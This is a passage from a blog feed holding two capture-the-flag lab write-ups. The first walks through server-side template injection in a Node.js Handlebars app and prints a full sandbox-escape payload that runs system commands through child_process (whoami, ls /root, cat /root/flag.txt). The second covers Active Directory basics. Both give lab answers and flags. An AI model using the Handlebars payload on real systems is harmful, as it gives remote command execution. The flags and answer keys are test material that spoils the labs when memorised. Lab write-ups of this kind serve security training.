<p>According to the official write up, <code>Server-side template injection</code> is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server. This attack is very common on Node.js websites and there is a good possibility that a Template Engine is being used to reflect the email that the user inputs in the contact field.</p>
<p>the following variety of special characters are commonly used in template expressions. Some of these payloads are used to identify SSTI vulnerabilities. If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation <code>7 * 7</code>, which is equal to 49.</p>






<pre tabindex="0"><code>{{7*7}}
${7*7}
&lt;%= 7*7 %&gt;
${{7*7}}
#{7*7}</code></pre>
<br>
<p>Inputted <code>{{7 * 7}}</code> into the email form and it outputted the following:
<img src="image-2.png#center" alt="alt text"></p>
<p>This output means that the payload was indeed detected as valid by the template engine, but the code had some error and was unable to be executed. An error is not always a bad thing. From this output, we can see that the server is running from the <code>/root/Backend</code> directory and also that the <code>Handlebars</code> Template is being used.</p>
<br>
<h4 id="what-is-the-templating-engine-being-used-within-nodejs">What is the templating engine being used within Node.js?</h4>






<pre tabindex="0"><code>Handlebars</code></pre>
<br>
<h4 id="what-is-the-name-of-the-burpsuite-tab-used-to-encode-text">What is the name of the BurpSuite tab used to encode text?</h4>






<pre tabindex="0"><code>Decoder</code></pre>
<br>
<h4 id="in-order-to-send-special-characters-in-our-payload-in-an-http-request-we-will-encode-the-payload-what-type-of-encoding-do-we-use">In order to send special characters in our payload in an HTTP request, we will encode the payload. What type of encoding do we use?</h4>






<pre tabindex="0"><code>URL</code></pre>
<p>When making a request to a web server, the data that we send can only contain certain characters from the standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For this reason we use an encoding procedure that is called <code>URL Encoding</code>.</p>
<p>With this process, the reserved character <code>&amp;</code> becomes <code>%26</code>. Burpsuite has a tab called <code>Decoder</code> that allows us to either decode or encode the text of our choice with various different encoding methods, including URL.</p>
<br>
<p>Let&rsquo;s copy the payload of Handlebars (NodeJS) from the HackTricks and paste into the Burpsuite Decoder.
<img src="image-3.png#center" alt="alt text"></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="when-we-use-a-payload-from-hacktricks-to-try-to-run-system-commands-we-get-an-error-back-what-is-not-defined-in-the-response-error">When we use a payload from HackTricks to try to run system commands, we get an error back. What is &ldquo;not defined&rdquo; in the response error?</h4>






<pre tabindex="0"><code>require</code></pre>
<p>I copied the URL encoded payload and pasted it in the email field via the request tab of Repeater. I sent the request and the response output showed that <code>require is not defined</code>. That&rsquo;s because our payload includes <code>require</code>, which is a Javascript keyword.</p>
<p>According to the Walkthrough, Template Engines are often Sanboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use <code>require</code> to load such modules, we will have to find a different way.</p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="what-variable-is-the-name-of-the-top-level-scope-in-nodejs">What variable is the name of the top-level scope in Node.JS?</h4>






<pre tabindex="0"><code>Global</code></pre>
<p>In computer programming <code>Globals</code> are variables that are globally accessible throughout the program. <code>require</code> keyword is in fact not in the global scope.</p>
<p>I modified my payload code like the following, I got the <code>status 200</code> response and the <code>require</code> object has been called successfully and the <code>child_process</code> module loaded.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>{{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;s&#34;</span> as <span style="color:#89dceb;font-weight:bold">|</span>string<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;e&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> split as <span style="color:#89dceb;font-weight:bold">|</span>conslist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span> {{<span style="color:#cba6f7">this</span>.push (lookup string.sub <span style="color:#a6e3a1">&#34;constructor&#34;</span>)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> string.split as <span style="color:#89dceb;font-weight:bold">|</span>codelist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span> {{<span style="color:#cba6f7">this</span>.push <span style="color:#a6e3a1">&#34;return process.mainModule.require(&#39;child_process&#39;);&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> {{<span style="color:#f38ba8">#</span>each conslist}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> (string.sub.apply <span style="color:#fab387">0</span> codelist)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> {{<span style="color:#cba6f7">this</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> {{<span style="color:#f38ba8">/each}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>{{<span style="color:#f38ba8">/with}}</span></span></span></code></pre></div>
<br>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<h4 id="by-exploiting-this-vulnerability-we-get-command-execution-as-the-user-the-webserver-is-running-as-what-is-the-name-of-that-user">By exploiting this vulnerability, we get command execution as the user the webserver is running as. What is the name of that user?</h4>






<pre tabindex="0"><code>root</code></pre>
<p>I attempted to run system commands now by running the following payload (of course I needed to URLencode it first through Burpsuite Decoder)</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>{{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;s&#34;</span> as <span style="color:#89dceb;font-weight:bold">|</span>string<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;e&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> split as <span style="color:#89dceb;font-weight:bold">|</span>conslist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span> {{<span style="color:#cba6f7">this</span>.push (lookup string.sub <span style="color:#a6e3a1">&#34;constructor&#34;</span>)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> string.split as <span style="color:#89dceb;font-weight:bold">|</span>codelist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span> {{<span style="color:#cba6f7">this</span>.push <span style="color:#a6e3a1">&#34;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;);&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> {{<span style="color:#f38ba8">#</span>each conslist}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> (string.sub.apply <span style="color:#fab387">0</span> codelist)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> {{<span style="color:#cba6f7">this</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> {{<span style="color:#f38ba8">/each}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>{{<span style="color:#f38ba8">/with}}</span></span></span></code></pre></div>
<p>The system command successfully returned <code>root</code>, meaning that I have run the system commands on the box and also that the web server is running in the context of the <code>root</code> user.</p>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>6b258d726d287462d60c103d0142a81c</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>{{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;s&#34;</span> as <span style="color:#89dceb;font-weight:bold">|</span>string<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;e&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> split as <span style="color:#89dceb;font-weight:bold">|</span>conslist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span> {{<span style="color:#cba6f7">this</span>.push (lookup string.sub <span style="color:#a6e3a1">&#34;constructor&#34;</span>)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> string.split as <span style="color:#89dceb;font-weight:bold">|</span>codelist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span> {{<span style="color:#cba6f7">this</span>.push <span style="color:#a6e3a1">&#34;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls /root&#39;);&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> {{<span style="color:#f38ba8">#</span>each conslist}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> (string.sub.apply <span style="color:#fab387">0</span> codelist)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> {{<span style="color:#cba6f7">this</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> {{<span style="color:#f38ba8">/each}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>{{<span style="color:#f38ba8">/with}}</span></span></span></code></pre></div>
<p>With the payload above which contains the command <code>ls /root</code>, I was able to confirm that the <code>root</code> directory contains the flag.txt file. All I need to do is modify the payload further for the one last time to display the flag.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>{{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;s&#34;</span> as <span style="color:#89dceb;font-weight:bold">|</span>string<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> <span style="color:#a6e3a1">&#34;e&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> split as <span style="color:#89dceb;font-weight:bold">|</span>conslist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span> {{<span style="color:#cba6f7">this</span>.push (lookup string.sub <span style="color:#a6e3a1">&#34;constructor&#34;</span>)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> string.split as <span style="color:#89dceb;font-weight:bold">|</span>codelist<span style="color:#89dceb;font-weight:bold">|</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span> {{<span style="color:#cba6f7">this</span>.push <span style="color:#a6e3a1">&#34;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /root/flag.txt&#39;);&#34;</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span> {{<span style="color:#cba6f7">this</span>.pop}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> {{<span style="color:#f38ba8">#</span>each conslist}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> {{<span style="color:#f38ba8">#</span><span style="color:#f38ba8">with</span> (string.sub.apply <span style="color:#fab387">0</span> codelist)}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> {{<span style="color:#cba6f7">this</span>}}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> {{<span style="color:#f38ba8">/each}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span> {{<span style="color:#f38ba8">/with}}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>{{<span style="color:#f38ba8">/with}}</span></span></span></code></pre></div>
<p>Got the flag.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Active Directory</title>
      <link>http://localhost:1313/thm-active-directory/</link>
      <pubDate>Tue, 16 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-active-directory/</guid>
      <description>Microsoft&amp;rsquo;s Active Directory is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment.
Windows domain is a group of users and computers under the administration of a given business. The main idea behind a domain is to centralize the administration of common components of a Windows computer network in a sigle repository called Active Directory. The server that runs the Active Directory service is known as a Domain Controller (DC).</description>
      <content:encoded><![CDATA[<p>Microsoft&rsquo;s <strong><em>Active Directory</em></strong> is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment.</p>
<p><code>Windows domain</code> is a group of users and computers under the administration of a given business. The main idea behind a domain is to centralize the administration of common components of a Windows computer network in a sigle repository called <code>Active Directory</code>. The server that runs the Active Directory service is known as a <code>Domain Controller (DC)</code>.</p>
<p>The main advantages of having a configured Windows domain are:</p>
<ul>
<li><strong><em>Centralized identity management</em></strong>: All users across the network can be configured from Active Directory with minimum effort.</li>
<li><strong><em>Managing security policies</em></strong>: You can configure security policies directly from Active Directory and apply them to users and computers across the network as needed.</li>
</ul>
<h4 id="a-real-world-example">A Real-World Example</h4>
<p>In school/university networks, you will often be provided with a username and password that you can use on any of the computers available on campus. Your credentials are valid for all machines because whenever you input them on a machine, it will forward the authentication process back to the Active Directory, where you credentials will be checked. Thanks to Active Directory, your credentials don&rsquo;t need to exist in each machine and are available throughout the network.</p>
<h4 id="in-a-windows-domain-credentials-are-stored-in-a-centralised-repository-called">In a Windows domain, credentials are stored in a centralised repository called..</h4>






<pre tabindex="0"><code>Active Directory</code></pre>
<br>
<h4 id="the-server-in-charge-of-running-the-active-directory-services-is-called">The server in charge of running the Active Directory services is called..</h4>






<pre tabindex="0"><code>Domain Controller</code></pre>
<br>
<p>The core of any Windows Domain is the <strong><em>Active Directory Domain Service (AD DS)</em></strong>. This service acts as a catalogue that holds the information of all the &ldquo;objects&rdquo; that exist on your network. Amongst the many objects supported by AD, we have users, groups, machines, printers, shares, and many others.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="security-groups-vs-ous-orgianizational-units">Security Groups vs OUs (Orgianizational Units)</h4>
<ul>
<li><strong><em>OUs</em></strong> are handy for applying policies to users and computers, which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn&rsquo;t make sense to try to apply two different policies to a single user.</li>
<li><strong><em>Security Groups</em></strong>, on the other hand, are used to grant permissions over resources. For example, you will use groups if you want to allow some users to access a shared folder or network printer. A user can be a part of many groups, which is needed to grant access to multiple resources.</li>
</ul>
<br>
<h4 id="which-group-normally-administrates-all-computers-and-resources-in-a-domain">Which group normally administrates all computers and resources in a domain?</h4>






<pre tabindex="0"><code>Domain Admins</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-would-be-the-name-of-the-machine-account-associated-with-a-machine-named-tom-pc">What would be the name of the machine account associated with a machine named TOM-PC?</h4>






<pre tabindex="0"><code>TOM-PC$</code></pre>
<br>
<h4 id="suppose-our-company-creates-a-new-department-for-quality-assurance-what-type-of-containers-should-we-use-to-group-all-quality-assurance-users-so-that-policies-can-be-applied-consistently-to-them">Suppose our company creates a new department for Quality Assurance. What type of containers should we use to group all Quality Assurance users so that policies can be applied consistently to them?</h4>






<pre tabindex="0"><code>Organizational Units</code></pre>
<br>
<h4 id="deletgation">Deletgation</h4>
<p>One of the nice things you can do in AD is to give specific users some control over some OUs. This process is known as <strong><em>delegation</em></strong> and allows you to grant users specific privileges to perform advanced tasks on OUs without needing a Domain Administrator to step in.</p>
<p>One of the most common use cases for this is granting <strong><em>IT Support</em></strong> the privileges to reset othe low-privilege users&rsquo; passwords.</p>
<br>
<p>I delegated our IT support (phillip) the rights to reset other people&rsquo;s passwords. Then I logged in as phillip then changed Sophie&rsquo;s passwords by running the following command:</p>
<p><code>Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') - Verbose</code></p>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-was-the-flag-found-on-sophies-desktop">What was the flag found on Sophie&rsquo;s desktop?</h4>






<pre tabindex="0"><code>THM{thanks_for_contacting_support}</code></pre>
<p><img src="image-3.png#center" alt="alt text">
<img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="the-process-of-granting-privileges-to-a-user-over-some-ou-or-other-ad-object-is-called">The process of granting privileges to a user over some OU or other AD Object is called&hellip;</h4>






<pre tabindex="0"><code>delegation</code></pre>
<br>
<h4 id="after-organizing-the-available-computers-how-many-ended-up-in-the-workstations-ou">After organizing the available computers, how many ended up in the Workstations OU?</h4>






<pre tabindex="0"><code>7</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="is-it-recommendable-to-create-separate-ous-for-servers-and-workstations-yaynay">Is it recommendable to create separate OUs for Servers and Workstations? (yay/nay)</h4>






<pre tabindex="0"><code>yay</code></pre>
<br>
